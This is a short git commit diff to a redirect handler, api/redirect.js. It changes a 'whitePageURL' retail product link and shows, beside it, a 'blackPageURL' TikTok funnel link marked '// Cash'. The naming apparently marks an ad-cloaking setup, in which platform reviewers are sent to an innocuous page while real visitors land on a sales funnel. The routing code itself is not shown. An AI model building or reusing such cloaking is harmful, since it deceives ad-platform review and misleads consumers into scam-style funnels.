d250345c7a76e12b15c7a014e03f4577496f4f6c
s4-glitchy <s4alicreator001@gmail.com>
2025-01-27 00:56:43 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.jokeshop.co.uk/det/3740/Lennon-Glasses-Orange/";
+    const whitePageURL = "https://www.sweaterchalet.com/dachstein-woolwear/dw-7110-adult-hat-orange/?srsltid=AfmBOoo32G76aMsDijulJVeNri8TCry3cx79NrrmXAQPiSgoTk2TMlHy";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-1231sdf";
   
